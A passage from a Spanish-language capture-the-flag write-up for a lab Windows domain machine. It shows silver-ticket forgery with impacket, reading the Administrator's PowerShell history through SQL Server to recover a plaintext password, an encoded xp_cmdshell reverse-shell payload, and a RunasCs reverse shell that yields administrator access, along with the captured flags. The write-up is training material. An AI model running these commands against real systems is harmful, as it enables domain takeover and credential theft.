[*] Meterpreter session 1 opened (10.10.14.79:7777 -> 10.10.11.90:50297) at 2025-10-13 02:17:41 -0700

meterpreter > getuid
Server username: SIGNED\mssqlsvc
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
d7516cc252641e4d1b4a2dbbddb475a2
```

## Escalate Privileges

Ya que estamos en la maquina, vamos aprovechar a visualizar los `SID` de los grupos privilegiados por ejemplo `Domain Admins` y `Enterprise Admins`, para obtener un `silver ticket` de dichos grupo y en vez de pertenecer al grupo `IT = sysadmin` vamos a obtener dichos grupos con el `RID` haciendo lo mismo de antes, pero cambiando algunas cosas, vamos a probar lo siguiente desde la `shell`.

```powershell
wmic group where "name='Domain Admins'" get name,sid
wmic group where "name='Enterprise Admins'" get name,sid
```

Info:

```
Name           SID                                            
Domain Admins  S-1-5-21-4088429403-1159899800-2753317549-512

Name               SID                                            
Enterprise Admins  S-1-5-21-4088429403-1159899800-2753317549-519
```

Veremos los `SID` de dichos grupos y tambien vemos que lo del principio son iguales que los anteriores, por lo que vamos a montarnos el comando de esta forma añadiendo los `RIDs` privilegiados de dichos grupos que hemos visto:

```shell
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb -groups 512,519,1105 -user-id 1103 mssqlsvc
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvcGroups
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvcGroups.ccache
```

Veremos que ha funcionado, vamos a probar a conectarnos con dicho `silver ticket`, entrando deberiamos de pertenecer al dichos grupos privilegiados.

```shell
impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Estando dentro y teniendo una sesion privilegiada con los grupos, vamos a probar a leer el `PowerShell`, pero antes hay que habilitar una serie de opciones para que funcione:

```mysql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;
```

Ahora con esto configurado, vamos a probar a leer el historial de comandos del `Administrador` en `PowerShell` que ha ido ejecutando.

```mysql
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',SINGLE_CLOB) AS x;
```

Info:

```
..............................<RESTO DE INFO>......................................
$Settings -User "SIGNED\\Administrator" -Password "Welcome1"\r\ncd ..\\Documents\\\r\nnotepad restart.ps1\r\nexplorer .\r\ndir ..\\Desktop\\\r\nmove ..\\Desktop\\cleanup.ps1 .\r\ndir ..\\Desktop\\\r\ndir\r\nGet-NetConnectionProfile\r\nSet-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset\r\nSet-Service TermService -StartupType disabled\r\nexit\r\nGet-NetConnectionProfile\r\nnltest
..............................<RESTO DE INFO>......................................
```

De toda esta informacion que vemos veremos una contraseña que ha sido utilizada en texto plano llamada `Th1s889Rabb!t` que al parecer pertenece al `administrador`.

Como no tenemos un puerto `WinRM` vamos a obtener de nuevo una `shell` por `metasploit` con el `payload` de antes que generamos con `msfvenom` y desde la consola de `sql` enviaremos el comando estando a la escucha desde `metasploit`.

```mysql
EXEC xp_cmdshell 'powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcA<RESTO DE BASE64>...';
```

Ahora si volvemos a donde tenemos la escucha del `multi/handler` en `metasploit` veremos lo siguiente:

```
[*] Started reverse TCP handler on 10.10.14.79:7777 
[*] Sending stage (203846 bytes) to 10.10.11.90
[*] Meterpreter session 2 opened (10.10.14.79:7777 -> 10.10.11.90:62887) at 2025-10-13 03:10:59 -0700

meterpreter > getuid
Server username: SIGNED\mssqlsvc
```

Veremos que ha funcionado de nuevo con esta otra sesion, ahora escribiremos `shell` para obtener una `shell` de interpreter de `PowerShell` de la maquina victima, para no estar con el `meterpreter`.

Pero antes vamos a descargarnos el `RunasCs.exe` para que esto pueda funcionar ya que estamos en una `shell` sin entorno grafico.

URL = [Download RunasCs.exe ZIP GitHub](https://github.com/antonioCoco/RunasCs/releases)

Una vez descargado el `.zip` del `RunasCs` vamos a descomprimirlo.

```shell
unzip RunasCs.zip
```

Info:

```
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe
```

Ahora desde el `meterpreter` vamos a descargarnos el `RunasCs.exe` llendo al directorio `Downloads` de nuestra carpeta de usuario para que podamos utilizarlo.

```shell
cd C:/Users/mssqlsvc/Downloads/
upload RunasCs.exe
```

Info:

```
[*] Uploading  : /home/kali/Desktop/signed/RunasCs.exe -> RunasCs.exe
[*] Uploaded 50.50 KiB of 50.50 KiB (100.0%): /home/kali/Desktop/signed/RunasCs.exe -> RunasCs.exe
[*] Completed  : /home/kali/Desktop/signed/RunasCs.exe -> RunasCs.exe
```

Ahora si desde una `shell` de `Windows` poniendo `shell` en el `meterpreter`...

Pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos este comando...

```powershell
.\RunasCs.exe Administrator Th1s889Rabb!t powershell.exe -r <IP>:<PORT>
```

Info:

```
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-562fe$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 672 created in background.
```

Ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 9999 ...
connect to [10.10.14.79] from (UNKNOWN) [10.10.11.90] 63590
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
signed\administrator
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario `administrador`.

> root.txt

```
f86cdb07ec5af2a4e8e4113a56409a5c
```
